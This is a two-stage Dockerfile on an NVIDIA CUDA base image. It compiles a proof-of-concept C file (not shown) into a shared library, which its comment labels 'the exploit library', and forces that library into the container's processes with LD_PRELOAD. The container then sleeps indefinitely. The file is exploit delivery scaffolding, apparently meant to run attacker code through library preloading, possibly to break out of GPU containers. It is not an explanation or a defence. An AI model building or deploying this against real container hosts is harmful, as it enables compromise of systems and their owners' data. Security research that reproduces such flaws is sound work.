# ---- build stage --------------------------------------------------
FROM nvidia/cuda:11.8.0-base-ubuntu20.04 AS builder
RUN apt-get update && DEBIAN_FRONTEND=noninteractive \
    apt-get install -y --no-install-recommends build-essential gcc
COPY poc.c /root/
RUN gcc -fPIC -shared -o /root/poc.so /root/poc.c

# ---- runtime stage -----------------------------------------------
FROM nvidia/cuda:11.8.0-base-ubuntu20.04
# copy the exploit library and drop build deps
COPY --from=builder /root/poc.so /poc.so
ENV LD_PRELOAD=/poc.so
CMD ["/bin/bash", "-c", "sleep infinity"]